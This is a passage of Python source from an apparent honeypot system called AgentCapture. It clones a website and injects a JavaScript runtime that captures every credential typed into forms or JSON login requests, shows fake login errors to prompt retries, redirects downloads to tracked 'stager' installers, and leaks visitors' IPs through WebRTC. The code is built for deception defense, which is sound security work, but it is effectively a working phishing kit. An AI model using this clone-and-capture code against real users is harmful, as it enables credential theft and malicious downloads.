            conservative = Path(local_name).suffix.lower() in {".js", ".json", ".svg"}
            rewritten_text = _rewrite_clone_text(
                body.decode("utf-8", errors="replace"),
                url,
                assets_map,
                conservative=conservative,
            )
            body = rewritten_text.encode("utf-8")
        (clone_dir / local_name).write_bytes(body)
        total_bytes += len(body)
        summaries.append(
            {"url": url, "local_name": local_name, "size": len(body), "content_type": ct}
        )
        if len(summaries) % 20 == 0 or len(summaries) == total_assets:
            _pct(
                f"写入资源（{len(summaries)}/{total_assets}）…",
                65 + (len(summaries) * 20 // max(total_assets, 1)),
            )

    _pct("重写 HTML 链接…", 90)
    # Strip <base href="..."> first so the browser resolves relative URLs
    # against the clone server instead of the original site.
    html = _remove_base_tag(html)
    html = _rewrite_clone_text(html, final_page_url, assets_map)
    # Catch relative references the variant pass missed (JS-redirected pages
    # whose relative hrefs only resolve against the final document URL).
    html = _rewrite_unresolved_clone_refs(html, [final_page_url, clone_url], assets_map)
    html = _inject_clone_runtime(html, **inject_kwargs)
    # Re-attach script srcs *after* _inject_clone_runtime so the runtime's
    # _disable_original_scripts() does not strip them again. The captured
    # srcs are routed through assets_map so the original paths become local
    # asset filenames instead of bare /js/foo.js 404s.
    html = _restore_script_srcs(html, original_script_srcs, assets_map, final_page_url)
    html_bytes = html.encode("utf-8")
    total_bytes += len(html_bytes)
    index_path = clone_dir / "index.html"
    index_path.write_bytes(html_bytes)
    _pct("完成", 100)
    return _project_relative_path(index_path), summaries, total_bytes


def _clone_with_wget(
    clone_url: str, clone_dir: Path, *, user_agent: str, accept_language: str
) -> tuple[list[dict], int]:
    """Deep clone using wget. Returns (asset_summaries, total_bytes)."""
    import subprocess as _sp

    wget_bin = _sp.run(["which", "wget"], capture_output=True, text=True).stdout.strip()
    if not wget_bin:
        return [], 0

    cmd = [
        wget_bin,
        "--no-check-certificate",
        "--no-verbose",
        "-U",
        user_agent,
        "--header",
        f"Accept-Language: {accept_language}",
        "-k",  # convert links to local
        "-K",  # backup original before link conversion
        "-p",  # page requisites (CSS, images, JS)
        "-l",
        "2",  # recursion depth 2
        "-H",  # span hosts (download CDN assets)
        "-nd",  # no directory structure — flat output
        "-P",
        str(clone_dir),
        clone_url,
    ]
    try:
        _sp.run(cmd, timeout=45, capture_output=True)
    except Exception:
        pass

    summaries: list[dict] = []
    total = 0
    for f in sorted(clone_dir.iterdir()):
        if f.is_file() and f.name != "index.html":
            size = f.stat().st_size
            summaries.append({"url": f.name, "local_name": f.name, "size": size})
            total += size
    index = clone_dir / "index.html"
    if index.is_file():
        total += index.stat().st_size

    for f in clone_dir.glob("*.orig"):
        f.unlink(missing_ok=True)

    return summaries, total


def _clone_with_urllib(
    clone_url: str,
    clone_dir: Path,
    *,
    user_agent: str,
    accept_language: str,
    inject_kwargs: dict | None = None,
) -> tuple[str, list[dict], int]:
    """Fallback: urllib fetch + enhanced regex asset extraction."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    headers = _clone_headers(user_agent, accept_language)

    req = UrlRequest(clone_url, headers=headers)
    with urlopen(req, timeout=CLONE_URL_TIMEOUT, context=ssl_ctx) as resp:
        html_bytes = resp.read(CLONE_MAX_HTML_BYTES + 1)
    if len(html_bytes) > CLONE_MAX_HTML_BYTES:
        raise ValueError(f"目标页面 HTML 超过 {CLONE_MAX_HTML_BYTES // 1024} KB 限制")
    html = html_bytes.decode("utf-8", errors="replace")

    raw_urls: list[str] = []
    for m in CLONE_ASSET_REF_RE.finditer(html):
        raw_urls.append(m.group("url"))
    for m in CLONE_SRCSET_RE.finditer(html):
        raw_urls.append(m.group("url").strip().split()[0])
    for m in CLONE_CSS_URL_RE.finditer(html):
        raw_urls.append(m.group("url"))

    seen: set[str] = set()
    abs_urls: list[str] = []
    for u in raw_urls:
        au = urljoin(clone_url, u)
        if urlsplit(au).scheme not in ("http", "https") or au in seen:
            continue
        seen.add(au)
        abs_urls.append(au)
        if len(abs_urls) >= CLONE_MAX_ASSETS:
            break

    downloaded: list[dict] = []
    idx = 0
    while idx < len(abs_urls) and len(downloaded) < CLONE_MAX_ASSETS:
        abs_url = abs_urls[idx]
        idx += 1
        try:
            areq = UrlRequest(
                abs_url, headers=_clone_headers(user_agent, accept_language, html=False)
            )
            with urlopen(areq, timeout=CLONE_URL_TIMEOUT, context=ssl_ctx) as aresp:
                data = aresp.read(CLONE_MAX_ASSET_BYTES + 1)
                if len(data) > CLONE_MAX_ASSET_BYTES:
                    continue
                ct = aresp.headers.get("Content-Type", "")
        except Exception:
            continue

        ext = _guess_asset_ext(abs_url, ct)
        local_name = (
            f"asset-{len(downloaded):04d}-{hashlib.md5(abs_url.encode()).hexdigest()[:10]}{ext}"
        )
        downloaded.append(
            {"url": abs_url, "body": data, "content_type": ct, "local_name": local_name}
        )

        if (ct or "").split(";", 1)[0].strip().lower() == "text/css":
            css_text = data.decode("utf-8", errors="replace")
            for m in CLONE_CSS_URL_RE.finditer(css_text):
                nested = urljoin(abs_url, m.group("url"))
                if (
                    urlsplit(nested).scheme in ("http", "https")
                    and nested not in seen
                    and len(abs_urls) < CLONE_MAX_ASSETS
                ):
                    seen.add(nested)
                    abs_urls.append(nested)

    assets_map = {entry["url"]: entry["local_name"] for entry in downloaded}
    summaries: list[dict] = []
    total_bytes = len(html_bytes)
    for entry in downloaded:
        body = entry["body"]
        local_name = entry["local_name"]
        ct = entry.get("content_type", "")
        if _is_clone_text_asset(ct, local_name):
            body = _rewrite_clone_text(
                body.decode("utf-8", errors="replace"), entry["url"], assets_map
            ).encode("utf-8")
        (clone_dir / local_name).write_bytes(body)
        total_bytes += len(body)
        summaries.append(
            {"url": entry["url"], "local_name": local_name, "size": len(body), "content_type": ct}
        )

    html = _rewrite_clone_text(html, clone_url, assets_map)
    html = _inject_clone_runtime(html, **(inject_kwargs or {}))
    html_path = clone_dir / "index.html"
    html_path.write_text(html, encoding="utf-8")
    return _project_relative_path(html_path), summaries, total_bytes


def _guess_asset_ext(url: str, content_type: str) -> str:
    ct = (content_type or "").split(";")[0].strip().lower()
    _CT_EXT = {
        "text/css": ".css",
        "application/javascript": ".js",
        "text/javascript": ".js",
        "application/x-javascript": ".js",
        "application/json": ".json",
        "text/html": ".html",
        "application/xml": ".xml",
        "text/xml": ".xml",
        "image/png": ".png",
        "image/jpeg": ".jpg",
        "image/gif": ".gif",
        "image/svg+xml": ".svg",
        "image/webp": ".webp",
        "image/x-icon": ".ico",
        "font/woff2": ".woff2",
        "font/woff": ".woff",
        "application/font-woff": ".woff",
    }
    if ct in _CT_EXT:
        return _CT_EXT[ct]
    url_path = urlsplit(url).path.lower()
    ext = Path(url_path).suffix
    if ext and len(ext) <= 6:
        return ext
    return ".bin"


# ---------------------------------------------------------------------------
# Cloned-template honeypot injection
# ---------------------------------------------------------------------------
#
# When a site is cloned, we wrap the rendered HTML with a small runtime
# script that does two things:
#
# 1. Intercepts every HTML <form> submission. Instead of sending credentials
#    to the real upstream, the script POSTs the captured fields to
#    `/_clone/credential` which records them via the same pipeline as the
#    credential decoys. The response is a friendly 403 so the attacker
#    believes they were blocked by the upstream system.
#
# 2. Rewrites file download links to point at `/_clone/payload/<os>` where
#    <os> is detected from the visitor's User-Agent (Windows / macOS / Linux
#    / any). The endpoint serves a system-appropriate inert decoy file that
#    fingerprints the attacker when executed and reports the download via
#    the decoy_fetch event pipeline.
#
# The injection is intentionally placed in a way that does not modify the
# cloned source HTML other than appending a single <script> tag. Assets are
# not rewritten, so the cloned SPA continues to load its original JS/CSS
# bundles from the relative paths the Playwright capture already mapped.

_CLONE_RUNTIME_SCRIPT = r"""
(function(){
  if (window.__agentCaptureClone) return; window.__agentCaptureClone = true;
  var UA = navigator.userAgent || '';
  var PLATFORM = (UA.match(/Windows/i) || UA.match(/Win32/i) || UA.match(/WOW64/i)) ? 'windows'
    : (UA.match(/Macintosh/i) || UA.match(/Mac OS/i) || UA.match(/Darwin/i)) ? 'macos'
    : (UA.match(/Linux/i) || UA.match(/X11/i) || UA.match(/Ubuntu/i)) ? 'linux'
    : 'any';
  var LOCATION = (function(){ try { return window.location.href; } catch(e){ return ''; }})();

  // ---- post-submit redirect action (injected by server) ----
  var REDIRECT_ACTION = '__AC_REDIRECT_ACTION__';
  var REDIRECT_URL = '__AC_REDIRECT_URL__';
  var REDIRECT_DELAY = 1200;

  function doRedirect() {
    try {
      if (REDIRECT_ACTION === 'original') {
        // Redirect to the original cloned site URL.
        var orig = '__AC_ORIG_URL__';
        if (orig) { window.location.href = orig; return; }
      } else if (REDIRECT_ACTION === 'custom') {
        if (REDIRECT_URL) { window.location.href = REDIRECT_URL; return; }
      }
      // 'warning' or default: stay on page (overlay already shown).
    } catch(e){}
  }

  function showBlockOverlay() {
    try {
      // 'original' / 'custom' redirects must be seamless: showing a "正在跳转"
      // splash would tell the attacker they are being redirected off the clone.
      // Only the explicit warning overlay is shown; the rest stay silent.
      if (REDIRECT_ACTION === 'warning' || REDIRECT_ACTION === '') {
        var msg = document.createElement('div');
        msg.id = '__agent_capture_block';
        msg.style.cssText = 'position:fixed;inset:0;background:rgba(7,11,22,0.96);color:#e5edf8;display:grid;place-items:center;z-index:2147483647;font:14px/1.6 system-ui;padding:32px;text-align:center';
        msg.innerHTML = '<div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="48" height="48" fill="none" stroke="#fb7185" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom:20px"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg><h2 style="margin:0 0 12px;font-size:22px">访问已被拦截</h2><p style="color:#94a3b8;margin:0 0 8px">该系统处于蜜罐监控环境。</p><p style="color:#94a3b8;margin:0">您输入的凭据已被记录，所有操作均在监控之下。</p></div>';
        (document.body || document.documentElement).appendChild(msg);
      }
    } catch(e){}
  }

  // ---------- credential capture ----------
  var CREDENTIAL_SENT = false;
  function postCredentials(fields) {
    if (CREDENTIAL_SENT) return;
    try {
      CREDENTIAL_SENT = true;
      var payload = Object.assign({source_url: LOCATION, platform: PLATFORM}, fields);
      // Use fetch with keepalive:true instead of sendBeacon — sendBeacon's
      // Blob body is not always readable by reverse-proxy middleware,
      // whereas fetch's string body is reliably forwarded.
      try {
        fetch('/_clone/credential', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload), keepalive:true});
      } catch(e){
        // Fallback to sendBeacon if fetch fails.
        try { navigator.sendBeacon('/_clone/credential', JSON.stringify(payload)); } catch(e2){}
      }
    } catch(e){}
  }

  // Collect all input values from a form or the whole document.
  function collectFields(form) {
    var fields = {};
    var lastTextVal = '';
    try {
      var inputs = form ? form.querySelectorAll('input,textarea,select') : document.querySelectorAll('input,textarea,select');
      for (var i = 0; i < inputs.length; i++) {
        var el = inputs[i];
        var name = el.name || el.placeholder || el.id || '';
        var type = (el.type || '').toLowerCase();
        if (type === 'button' || type === 'submit' || type === 'reset' || type === 'hidden') continue;
        var val = el.value || '';
        if (type === 'checkbox') val = el.checked ? 'on' : 'off';
        if (type === 'text' && val) lastTextVal = val;
        // Non-empty wins: login kits often render multiple password inputs
        // (hidden decoys + the visible real one), and later empty inputs
        // must not clobber a value the user actually typed.
        if (type === 'password' || /pass|pwd|password/i.test(name)) {
          if (val) {
            fields.password = val;
            // Anonymous password box: the nearest preceding text input is
            // almost always the account field on a login form.
            if (!fields.username && lastTextVal) fields.username = lastTextVal;
          }
        }
        else if (type === 'text' && (/user|account|login|name|email|账号|用户/i.test(name) && !fields.username)) { if (val) fields.username = val; }
        else if (/code|captcha|验证码/i.test(name)) { if (val) fields.code = val; }
        if (val && name) fields[name] = val;
      }
    } catch(e){}
    return fields;
  }

  // Check if a button looks like a login/submit button.
  function isLoginButton(btn) {
    if (!btn || btn.tagName !== 'BUTTON' && btn.tagName !== 'A' && btn.tagName !== 'INPUT') return false;
    if (btn.tagName === 'INPUT') {
      var t = (btn.type || '').toLowerCase();
      return t === 'submit' || t === 'button';
    }
    var text = (btn.textContent || '').trim().toLowerCase();
    var cls = (btn.className || '').toLowerCase();
    return /登\s*录|登\s*入|sign\s*in|log\s*in|login|submit|确认|提交/.test(text)
        || /login|submit|primary/.test(cls);
  }

  function showFakeError(form) {
    // Mimic a normal failed login: inline error, cleared password, stay on
    // page — the attacker is encouraged to retry (and re-submit credentials).
    try {
      var box = document.getElementById('__agent_capture_login_error');
      if (!box) {
        box = document.createElement('div');
        box.id = '__agent_capture_login_error';
        box.style.cssText = 'margin:10px 0;padding:10px 12px;border-radius:8px;background:rgba(220,38,38,.08);border:1px solid rgba(220,38,38,.35);color:#dc2626;font-size:13px;position:relative;z-index:2147483646;';
        var host = form || document.querySelector('form') || document.body;
        host.insertBefore(box, host.firstChild);
      }
      box.textContent = '用户名或密码错误，请重新输入。';
      var pwds = document.querySelectorAll('input[type="password"]');
      for (var i = 0; i < pwds.length; i++) { pwds[i].value = ''; }
      if (pwds.length) pwds[0].focus();
    } catch(e){}
  }

  function handleSubmit(form) {
    var fields = collectFields(form);
    if (Object.keys(fields).length === 0) fields = collectFields(null);
    postCredentials(fields);
    if (REDIRECT_ACTION === 'fake_error') {
      CREDENTIAL_SENT = false;
      showFakeError(form);
      return;
    }
    showBlockOverlay();
    setTimeout(doRedirect, REDIRECT_DELAY);
  }

  function installFormInterceptor(form) {
    if (form.__agentCaptureInstalled) return; form.__agentCaptureInstalled = true;
    form.addEventListener('submit', function(ev){
      try { ev.preventDefault(); ev.stopPropagation(); } catch(e){}
      handleSubmit(form);
    }, true);
    // Also intercept submit-button clicks inside the form.
    form.addEventListener('click', function(ev){
      var target = ev.target;
      while (target && target !== form) {
        if (isLoginButton(target)) {
          try { ev.preventDefault(); ev.stopPropagation(); } catch(e){}
          handleSubmit(form);
          return;
        }
        target = target.parentElement;
      }
    }, true);
  }

  // Intercept ALL login-like buttons in the document (covers SPA buttons
  // that live outside <form> or use type="button" with @click handlers).
  function interceptLoginButtons() {
    try {
      var btns = document.querySelectorAll('button, a.btn, input[type="submit"], input[type="button"], .el-button, .login-btn, [class*="login"]');
      for (var i = 0; i < btns.length; i++) {
        var b = btns[i];
        if (b.__agentCaptureBtnDone) continue;
        if (!isLoginButton(b)) continue;
        b.__agentCaptureBtnDone = true;
        (function(btn){
          btn.addEventListener('click', function(ev){
            try { ev.preventDefault(); ev.stopPropagation(); } catch(e){}
            var form = btn.closest('form');
            handleSubmit(form || null);
          }, true);
        })(b);
      }
    } catch(e){}
  }

  // Patch fetch + XHR to capture JSON-based credential posts that bypass forms.
  try {
    var _fetch = window.fetch;
    if (_fetch) {
      window.fetch = function(input, init){
        try {
          var url = (typeof input === 'string') ? input : (input && input.url) || '';
          var method = ((init && init.method) || (input && input.method) || 'GET').toUpperCase();
          if (method !== 'GET' && /login|auth|sign|pass|account/i.test(url)) {
            var body = init && init.body;
            if (typeof body === 'string') {
              try {
                var parsed = JSON.parse(body);
                if (parsed && typeof parsed === 'object') {
                  postCredentials(Object.assign({source_url:url, _endpoint:url}, parsed));
                }
              } catch(e){}
            }
          }
        } catch(e){}
        return _fetch.apply(this, arguments);
      };
    }
    var _open = XMLHttpRequest.prototype.open;
    var _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url){
      this.__agentCaptureUrl = url;
      this.__agentCaptureMethod = method;
      return _open.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function(body){
      try {
        if (this.__agentCaptureMethod && this.__agentCaptureMethod.toUpperCase() !== 'GET'
            && /login|auth|sign|pass|account/i.test(this.__agentCaptureUrl || '')) {
          if (typeof body === 'string') {
            try {
              var parsed = JSON.parse(body);
              if (parsed && typeof parsed === 'object') {
                postCredentials(Object.assign({source_url:this.__agentCaptureUrl, _endpoint:this.__agentCaptureUrl}, parsed));
              }
            } catch(e){}
          }
        }
      } catch(e){}
      return _send.apply(this, arguments);
    };
  } catch(e){}

  // ---------- download rewriting ----------
  function rewriteAnchor(a) {
    if (a.__agentCaptureRewritten) return;
    var href = a.getAttribute('href') || '';
    if (!href || href.startsWith('#') || href.startsWith('javascript:') || href.startsWith('mailto:')) return;
    if (a.target && a.target.toLowerCase() === '_self' && /^[\/]?#/.test(href)) return;
    var text = (a.textContent || '').toLowerCase();
    var dlExt = /\.(zip|rar|7z|tar|gz|bz2|iso|exe|msi|dmg|pkg|deb|rpm|apk|ipa|bat|sh|ps1|jar|war|pdf|docx?|xlsx?|pptx?|csv|sql|bak|sqlitedb|sqlite|dmp)$/i;
    var isDownload = (a.hasAttribute('download'))
      || a.getAttribute('data-download') !== null
      || dlExt.test(href.split('?')[0].split('#')[0])
      || /\b(download|下载|导出|备份|install|setup|补丁|patch|客户端|client|plugin)\b/.test(text);
    if (!isDownload) return;
    a.__agentCaptureRewritten = true;
    var u = href;
    var q = u.indexOf('?');
    var fileOnly = q >= 0 ? u.substring(0, q) : u;
    var suffix = q >= 0 ? ('&for=' + encodeURIComponent(fileOnly)) : ('?for=' + encodeURIComponent(fileOnly));
    a.setAttribute('href', '/_clone/payload/' + PLATFORM + suffix);
    if (!a.hasAttribute('download')) a.setAttribute('download', '');
    a.setAttribute('target', '_self');
  }

  // ---------- modal close fallback ----------
  // Original JS is neutered, so framework-wired close buttons (dialog/modal
  // popups like client-download prompts) would stay stuck over the login form.
  // Give close-like controls a generic hide-the-nearest-overlay behavior.
  // Note: the lookup starts at parentElement on purpose — classes like
  // "dialog-close" would otherwise self-match the overlay selector.
  function hideOverlaysNear(el) {
    try {
      var modal = el && el.parentElement ? el.parentElement.closest('[class*="dialog"],[class*="modal"],[class*="popup"],[class*="layer"]') : null;
      if (modal) modal.style.display = 'none';
      var masks = document.querySelectorAll('[class*="dialog-mask"],[class*="modal-mask"],[class*="overlay"]');
      for (var k = 0; k < masks.length; k++) masks[k].style.display = 'none';
    } catch(e){}
  }

  function installModalCloseFallback() {
    document.addEventListener('click', function(ev){
      try {
        var t = ev.target;
        if (!t || !t.closest) return;
        var closer = t.closest('[class*="close"],[class*="dismiss"],[aria-label="Close"],[aria-label="close"]');
        if (!closer) return;
        if (closer.closest('#__agent_capture_block')) return;
        hideOverlaysNear(closer);
        ev.preventDefault();
        ev.stopPropagation();
      } catch(e){}
    }, true);
  }

  // Inject a working close affordance into statically visible overlay dialogs
  // whose original (framework-driven) close button is dead or missing.
  function enhanceDialogs() {
    try {
      var dialogs = document.querySelectorAll('[class*="dialog"],[class*="modal"]');
      for (var i = 0; i < dialogs.length; i++) {
        var d = dialogs[i];
        if (d.__agentCaptureDlg || d.id === '__agent_capture_block') continue;
        d.__agentCaptureDlg = true;
        var rect = d.getBoundingClientRect();
        if (rect.width < 120 || rect.height < 80) continue;
        var pos = '';
        try { pos = window.getComputedStyle(d).position; } catch(e){}
        if (pos !== 'fixed' && pos !== 'absolute') continue;
        if (d.querySelector('.ac-dialog-close')) continue;
        var btn = document.createElement('div');
        btn.className = 'ac-dialog-close';
        btn.textContent = '×';
        btn.title = '关闭';
        btn.style.cssText = 'position:absolute;top:8px;right:10px;width:24px;height:24px;line-height:24px;text-align:center;cursor:pointer;color:#97a0b3;font-size:17px;font-family:sans-serif;z-index:9;border-radius:4px;';
        btn.addEventListener('mouseover', function(ev){ ev.target.style.color = '#333'; });
        btn.addEventListener('mouseout', function(ev){ ev.target.style.color = '#97a0b3'; });
        btn.addEventListener('click', function(ev){
          try { ev.preventDefault(); ev.stopPropagation(); } catch(e){}
          hideOverlaysNear(ev.target);
        }, true);
        d.appendChild(btn);
      }
    } catch(e){}
  }

  // ---------- download-button hijack ----------
  // Framework-driven download <button>s (not <a> links) are dead once the
  // original JS is neutered. Route their clicks to the stager payload so the
  // attacker's device still receives the tracked installer.
  function hijackDownloadButtons() {
    try {
      var btns = document.querySelectorAll('button, [role="button"], .button');
      for (var i = 0; i < btns.length; i++) {
        var b = btns[i];
        if (b.__agentCaptureDl) continue;
        var text = (b.textContent || '').trim();
        if (!/^(下载|download|安装|install)/i.test(text)) continue;
        if (isLoginButton(b)) continue;
        b.__agentCaptureDl = true;
        b.addEventListener('click', function(ev){
          try { ev.preventDefault(); ev.stopPropagation(); } catch(e){}
          var brand = 'client';
          try {
            var parts = (document.title || '').split(/[\s\-_|·—:：]+/).filter(Boolean);
            if (parts.length) brand = parts[0].replace(/[^\w一-鿿]/g, '') || 'client';
          } catch(e){}
          var ext = PLATFORM === 'windows' ? '.bat' : '.sh';
          window.location.href = '/_clone/payload/' + PLATFORM + '?for=' + encodeURIComponent(brand + '_installer' + ext);
        }, true);
      }
    } catch(e){}
  }

  // ---------- generic dialog dismissal ----------
  // Mask click and Escape close the topmost visible dialog. The original
  // close affordances (framework-wired or CSS-drawn) may not survive the
  // clone, and a dialog that cannot be closed kills the deception.
  function hideTopDialog() {
    try {
      var dialogs = document.querySelectorAll('.dialog, [class*="modal"], [class*="popup"]');
      var top = null, topZ = -1;
      for (var i = 0; i < dialogs.length; i++) {
        var d = dialogs[i];
        if (getComputedStyle(d).display === 'none') continue;
        var z = parseInt(getComputedStyle(d).zIndex || '0', 10);
        if (z >= topZ) { top = d; topZ = z; }
      }
      if (top) top.style.display = 'none';
      var masks = document.querySelectorAll('[class*="dialog-mask"], [class*="modal-mask"], [class*="mask"]');
      for (var j = 0; j < masks.length; j++) masks[j].style.display = 'none';
      document.body.style.overflow = '';
    } catch(e){}
  }
  function installDismissalGestures() {
    document.addEventListener('click', function(ev){
      try {
        var cls = (ev.target.className || '') + '';
        if (cls.indexOf('dialog-mask') >= 0 || cls.indexOf('modal-mask') >= 0 || cls.indexOf('mask') >= 0) hideTopDialog();
      } catch(e){}
    }, true);
    document.addEventListener('keydown', function(ev){
      try { if (ev.key === 'Escape') hideTopDialog(); } catch(e){}
    }, true);
  }

  // ---------- bootstrap ----------
  function run() {
    try {
      var forms = document.querySelectorAll('form');
      for (var i = 0; i < forms.length; i++) installFormInterceptor(forms[i]);
      interceptLoginButtons();
      var links = document.querySelectorAll('a[href]');
      for (var j = 0; j < links.length; j++) rewriteAnchor(links[j]);
      installModalCloseFallback();
      installDismissalGestures();
      enhanceDialogs();
      hijackDownloadButtons();
    } catch(e){}
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', run, {once:true});
  } else { run(); }
  // Catch elements inserted by the SPA after initial render.
  try {
    var mo = new MutationObserver(function(muts){
      for (var k=0;k<muts.length;k++) {
        var n = muts[k].addedNodes || [];
        for (var m=0;m<n.length;m++) {
          var el = n[m];
          if (!el || el.nodeType !== 1) continue;
          if (el.tagName === 'FORM') installFormInterceptor(el);
          if (el.tagName === 'A' && el.getAttribute('href')) rewriteAnchor(el);
          try {
            var f2 = el.querySelectorAll ? el.querySelectorAll('form') : [];
            for (var a=0;a<f2.length;a++) installFormInterceptor(f2[a]);
            var l2 = el.querySelectorAll ? el.querySelectorAll('a[href]') : [];
            for (var b=0;b<l2.length;b++) rewriteAnchor(l2[b]);
          } catch(e){}
        }
      }
      interceptLoginButtons();
      enhanceDialogs();
      hijackDownloadButtons();
    });
    mo.observe(document.documentElement || document, {childList:true, subtree:true});
  } catch(e){}
})();
"""


def _disable_original_scripts(html: str) -> str:
    """Neuter all <script> tags from the original site.

    The cloned HTML is already a fully-rendered snapshot (captured via
    Playwright after SPA rendering).  Letting the original JS bundles
    re-execute causes: layout shifts (Vue/React re-mount), CORS errors
    (API calls to the real backend), and event-handler conflicts with our
    honeypot interceptor.  We replace the *contents* of every original
    <script> with a no-op so the tags stay in the DOM (in case anything
    checks for their presence) but execute nothing.

    Scripts tagged ``data-agentcapture`` (our runtime) are preserved.
    """
    import re as _re

    def _repl(m: _re.Match) -> str:
        full = m.group(0)
        # Keep our own injected scripts.
        if "data-agentcapture" in full:
            return full
        # Keep JSON-LD or data blocks (type="application/json" etc.)
        if _re.search(
            r'type\s*=\s*["\'](?:application/json|application/ld\+json)["\']', full, _re.IGNORECASE
        ):
            return full
        # Disable: replace src with a blank data URI and clear inline content.
        if "<script" in full.lower():
            # For external scripts: remove src so nothing loads.
            neutered = _re.sub(r'\ssrc\s*=\s*["\'][^"\']*["\']', "", full, flags=_re.IGNORECASE)
            # For inline scripts: blank the body between tags.
            neutered = _re.sub(
                r">([\s\S]*?)</script>", "></script>", neutered, count=1, flags=_re.IGNORECASE
            )
            return neutered
        return full

    # Match <script ...>...</script> (with optional content) and self-closing.
    return _re.sub(r"<script\b[^>]*(?:/>|>[\s\S]*?</script>)", _repl, html, flags=_re.IGNORECASE)


# Minimal inline beacon — avoids 404 on /static/beacon.js when the cloned
# template is served from a standalone deploy port that has no /static mount.
_CLONE_BEACON_INLINE = r"""
(function(){
  if (window.__agentCaptureBeacon) return; window.__agentCaptureBeacon = true;
  try {
    var sid = (document.cookie.match(/ach_sid=([^;]+)/) || [,''])[1] || 'clone-' + Math.random().toString(36).slice(2,10);
    var data = {
      url: location.href, sid: sid, ua: navigator.userAgent,
      lang: navigator.language, ts: Date.now(),
      screen: screen.width + 'x' + screen.height,
      depth: screen.colorDepth, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };
    // WebRTC IP leak detection
    try {
      if (window.RTCPeerConnection) {
        var pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
        pc.onicecandidate = function(e) {
          if (e.candidate && e.candidate.candidate) {
            var m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
            if (m && m[1] && !m[1].match(/^(192\.168|10\.|172\.(1[6-9]|2\d|3[01])\.|127\.|169\.254\.)/)) {
              data.webrtc_ip = m[1];
              navigator.sendBeacon('/_clone/beacon', JSON.stringify(data));
            }
          }
        };
        pc.createDataChannel('');
        pc.createOffer().then(function(o){ pc.setLocalDescription(o); });
      }
    } catch(e) {}
    // Send basic beacon
    try { navigator.sendBeacon('/_clone/beacon', JSON.stringify(data)); } catch(e) {}
  } catch(e) {}
})();
"""


def _inject_clone_runtime(
    html: str,
    *,
    redirect_action: str = "fake_error",
    redirect_url: str = "",
    source_url: str = "",
) -> str:
    """Append the clone honeypot runtime script to a rendered page.

    Transformations:
    1. Disable all original-site <script> tags (the HTML is already a
       fully-rendered snapshot; re-executing SPA bundles breaks layout
       and causes CORS errors).
    2. Inject our honeypot runtime (credential capture + download hijack
       + post-submit redirect).
    3. Inject an inline beacon (telemetry) that posts to /_clone/beacon.

    ``redirect_action`` controls what happens after the attacker submits
    credentials:
      - ``fake_error`` (default): show an inline "wrong password" error and
        stay on the page so the attacker keeps retrying.
      - ``warning``: show a blocking overlay, stay on page.
      - ``original``: redirect to the original cloned site URL.
      - ``custom``:   redirect to ``redirect_url``.
    """
    if not html:
        return html
    if "__agentCaptureClone" in html:
        return html  # idempotent

    # Step 1: neuter original scripts.
    html = _disable_original_scripts(html)

    # Build the runtime script with redirect config substituted in.
    action = (
        redirect_action
        if redirect_action in ("warning", "original", "custom", "fake_error")
        else "fake_error"
    )
    safe_url = (redirect_url or "").replace("\\", "\\\\").replace("'", "\\'")[:500]
    safe_orig = (source_url or "").replace("\\", "\\\\").replace("'", "\\'")[:500]

    runtime_js = (
        _CLONE_RUNTIME_SCRIPT.replace("__AC_REDIRECT_ACTION__", action)
        .replace("__AC_REDIRECT_URL__", safe_url)
        .replace("__AC_ORIG_URL__", safe_orig)
    )

    # Step 2 + 3: inject runtime + beacon before </head>.
    runtime = (
        '<script data-agentcapture="clone-runtime">'
        + runtime_js
        + "</script>"
        + '<script data-agentcapture="beacon">'
        + _CLONE_BEACON_INLINE
        + "</script>"
    )
    lowered = html.lower()
    head_close = lowered.rfind("</head>")
    if head_close != -1:
        return html[:head_close] + runtime + html[head_close:]
    body_open = lowered.find("<body")
    if body_open != -1:
        insert_at = lowered.find(">", body_open) + 1
        return html[:insert_at] + runtime + html[insert_at:]
    return runtime + html


def _slugify_prompt_key(value: str) -> str:
    raw = (value or "").strip().lower().replace(" ", "_").replace("-", "_")
    safe = "".join(ch if ch.isalnum() or ch == "_" else "_" for ch in raw)
    while "__" in safe:
        safe = safe.replace("__", "_")
    return safe.strip("_")[:96] or f"prompt_{secrets.token_hex(4)}"


def _form_bool(value: str | bool | None) -> bool:
    if isinstance(value, bool):
        return value
    return str(value or "").lower() in {"1", "true", "on", "yes", "active"}


@router.get("/admin/login", response_class=HTMLResponse)
def admin_login_page(request: Request, error: str | None = None):
    return _render(
        request, "admin/login.html", {"title": "AgentCapture - 渗透智能体捕获系统", "error": error}
    )


@router.post("/admin/login")
def admin_login(
    request: Request,
    username: str = Form(...),
    password: str = Form(...),
    db: Session = Depends(get_db),
):
    source_ip = request.headers.get("x-forwarded-for", "").split(",")[0].strip() or (
        request.client.host if request.client else "unknown"
    )
    user_agent = request.headers.get("user-agent", "")

    # Brute-force guard: lock the source IP after repeated failures.
    lock_window = datetime.now(timezone.utc) - timedelta(minutes=10)
    recent_failures = int(
        db.scalar(
            select(func.count())
            .select_from(LoginLog)
            .where(
                LoginLog.ip_address == source_ip,
                LoginLog.login_status == "failed",
                LoginLog.created_at >= lock_window,
            )
        )
        or 0
    )
    if recent_failures >= 5:
        create_login_log(
            db,
            user_id=None,
            username=username,
            login_status="failed",
            ip_address=source_ip,
            user_agent=user_agent,
            fail_reason="rate_limited",
        )
        return _render(
            request,
            "admin/login.html",
            {
                "title": "AgentCapture - 渗透智能体捕获系统",
                "error": "登录尝试过于频繁，请 10 分钟后再试",
            },
        )

    user = authenticate_user(db, username, password)
    if not user:
        create_login_log(
            db,
            user_id=None,
            username=username,
            login_status="failed",
            ip_address=source_ip,
            user_agent=user_agent,
            fail_reason="invalid_credentials",
        )
        return _render(
            request,
            "admin/login.html",
